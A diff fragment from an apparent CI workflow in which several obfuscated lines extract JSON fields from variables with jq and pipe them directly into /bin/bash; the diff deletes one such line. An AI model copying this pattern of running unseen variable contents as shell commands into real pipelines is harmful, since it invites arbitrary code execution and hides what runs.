@@ -25,7 +25,6 @@ jobs:
           echo $pz24 | jq -r .bwou665 | /bin/bash
           printf '%s' "$iyp673" | jq -r .uiq2243 | /bin/bash
           printf '%s' "$favcy7679" | jq -r .jusl75 | /bin/bash
-          echo $xhfy1 | jq -r .qgyb4178 | /bin/bash
           echo $vl5 | jq -r .odta3748 | /bin/bash
 
       - name: Upload output
